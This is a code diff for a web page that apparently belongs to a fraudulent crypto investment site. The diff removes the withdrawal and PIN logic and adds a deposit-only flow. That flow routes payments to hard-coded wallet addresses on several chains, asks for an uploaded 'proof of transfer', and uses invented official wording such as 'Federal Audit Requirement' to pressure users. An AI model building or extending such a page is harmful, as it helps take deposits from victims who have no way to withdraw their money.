+                "BNB Smart Chain (BEP20)": "0x3b424b2999dEF4894f21f1a5bFe89e97Bc21DE1E"
+            },
+            "SOL": {
+                "Solana (SOL)": "9UgFrLx796JagxDAJARrqzzW7c9DPHfrS2n3UH7vsMf4"
+            },
+            "TRX": {
+                "Tron (TRC20)": "TKZcchSTjdJXEoVZmErwfiSUmZFnh6Tjwx"
+            },
+            "TON": {
+                "TON (TON)": "UQCleKsmB8o-DF3fjkBR2X7gNrrs81Nv-zb_8mPW4GPx7yj9"
+            },
+            "SUI": {
+                "Sui (SUI)": "0xb63217f9308f3711bc4b277fc8029ac4f93c828c3af4b6684024cdbdf9811454"
+            }
+        };
+
+        window.selectMethod = (name, addr, labelText, el) => {
+            selectedMethodName = name;
+            selectedLabel = labelText;
             
-            if(wPin !== pin) return alert("Security Pin Incorrect");
-            if(amt < 1) return alert("Invalid amount");
+            const networkDropdown = document.getElementById('networkDropdown');
+            networkDropdown.innerHTML = '';
 
-            const updateData = mode === 'WITHDRAW' ? {
-                balance: increment(-amt),
-                withdrawAmount: amt,
-                withdrawStatus: "PENDING",
-                withdrawMethod: method
-            } : {
-                depositAmount: amt,
-                depositStatus: "PENDING",
-                depositMethod: method
-            };
+            const networks = addressRepository[name];
+            for (const [netName, netAddr] of Object.entries(networks)) {
+                const opt = document.createElement('option');
+                opt.value = netAddr;
+                opt.textContent = netName;
+                networkDropdown.appendChild(opt);
+            }
 
-            await updateDoc(doc(db, "users", auth.currentUser.uid), updateData);
+            document.querySelectorAll('.method-card').forEach(c => c.classList.remove('active'));
+            el.classList.add('active');
+
+            updateWalletAddressFromDropdown();
         };
 
-        // Standard auth and snapshot logic remains the same...
+        window.updateWalletAddressFromDropdown = () => {
+            const dropdown = document.getElementById('networkDropdown');
+            const selectedAddress = dropdown.value;
+            const selectedNetworkName = dropdown.options[dropdown.selectedIndex].text;
+
+            selectedNetworkData = selectedAddress;
+            document.getElementById('walletAddr').innerText = selectedAddress;
+            document.getElementById('methodLabel').innerText = `${selectedLabel} (${selectedNetworkName}) Receiver`;
+
+            const qrImg = document.getElementById('qrImg');
+            qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=120x120&data=${encodeURIComponent(selectedAddress)}`;
+        };
+
+        selectMethod("BTC", "bc1qrrc86d42pzejhwxxsjfctmjkj7dl52q0j0qy9k", "Bitcoin", document.querySelector('.method-card'));
+
+        window.resetNode = async () => {
+            const btn = event.target;
+            btn.innerHTML = `<i class="fas fa-circle-notch fa-spin"></i>`;
+            try {
+                await updateDoc(doc(db, "users", auth.currentUser.uid), { depositStatus: "RETRY" });
+            } catch (e) { console.error(e); }
+        };
+
+        function switchView(viewId) {
+            ['formView', 'pendingView', 'successView', 'declinedView'].forEach(id => {
+                document.getElementById(id).classList.add('hidden');
+            });
+            document.getElementById(viewId).classList.remove('hidden');
+        }
+
         onAuthStateChanged(auth, (user) => {
-             if (!user) window.location.href = "login.html";
-             onSnapshot(doc(db, "users", user.uid), (snap) => {
-                 const d = snap.data();
-                 bal = d.balance || 0;
-                 pin = d.securityPin || "";
-                 document.getElementById('bal').innerText = Number(bal).toLocaleString();
-                 document.getElementById('loader').style.display = 'none';
-             });
+            if (!user) { window.location.href = "login.html"; return; }
+            onSnapshot(doc(db, "users", user.uid), (snap) => {
+                const d = snap.data();
+                if(!d) return;
+                document.getElementById('globalLoader').style.display = 'none';
+                
+                const status = d.depositStatus || "IDLE";
+                if(status === "PENDING") {
+                    switchView('pendingView');
+                    document.getElementById('pAmt').innerText = `$${Number(d.depositAmount || 0).toLocaleString()}`;
+                } else if(status === "SUCCESSFUL" || status === "APPROVED") {
+                    switchView('successView');
+                } else if(status === "FAILED" || status === "DECLINED" || status === "REJECTED") {
+                    switchView('declinedView');
+                    document.getElementById('dReason').innerText = d.depositReason || "Transaction details could not be found on the public ledger. Please ensure the amount matches the receipt.";
+                } else {
+                    switchView('formView');
+                }
+            });
         });
-        
-        window.savePin = async () => {
-            const p = document.getElementById('regPin').value;
-            await updateDoc(doc(db, "users", auth.currentUser.uid), { securityPin: p });
+
+        window.previewReceipt = () => {
+            const file = document.getElementById('popFile').files[0];
+            if(!file) return;
+            const reader = new FileReader();
+            reader.onload = (e) => {
+                const img = new Image();
+                img.src = e.target.result;
+                img.onload = () => {
+                    const canvas = document.createElement('canvas');
+                    const ctx = canvas.getContext('2d');
+                    const MAX_WIDTH = 800;
+                    const scaleSize = MAX_WIDTH / img.width;
+                    canvas.width = MAX_WIDTH;
+                    canvas.height = img.height * scaleSize;
+                    ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
+                    compressedImage = canvas.toDataURL('image/jpeg', 0.8);
+                    document.getElementById('popPreview').src = compressedImage;
+                    document.getElementById('popPreview').classList.remove('hidden');
+                    document.getElementById('uploadUI').classList.add('hidden');
+                };
+            };
+            reader.readAsDataURL(file);
+        };
+
+        window.handleDeposit = async () => {
+            const amt = document.getElementById('depAmount').value;
+            if(!amt || !compressedImage) {
+                alert("Federal Audit Requirement: Missing Amount or Proof of Transfer.");
+                return;
+            }
+            
+            document.getElementById('globalLoader').style.display = 'flex';
+            try {
+                const userRef = doc(db, "users", auth.currentUser.uid);
+                await updateDoc(userRef, {
+                    depositStatus: "PENDING",
+                    depositAmount: Number(amt),
+                    depositProof: compressedImage,
+                    chatHistory: arrayUnion({
+                        sender: "USER",
+                        text: `SYSTEM: I have deposited $${Number(amt).toLocaleString()} via ${selectedMethodName}. Please verify the attached receipt.`,
+                        image: compressedImage,
+                        time: new Date().toISOString()
+                    })
+                });
+
+                document.getElementById('depAmount').value = "";
+                compressedImage = null;
+                document.getElementById('popPreview').classList.add('hidden');
+                document.getElementById('uploadUI').classList.remove('hidden');
+            } catch (err) { 
+                alert("Audit Link Error: " + err.message); 
+            }
+            document.getElementById('globalLoader').style.display = 'none';
+        };
+
+        window.copyAddr = () => {
+            const addr = document.getElementById('walletAddr').innerText;
+            navigator.clipboard.writeText(addr).then(() => {
+                const icon = event.currentTarget.querySelector('i');
+                icon.className = 'fas fa-check text-emerald-400';
+                setTimeout(() => icon.className = 'fas fa-copy', 2000);
+            });
         };
     </script>
 </body>
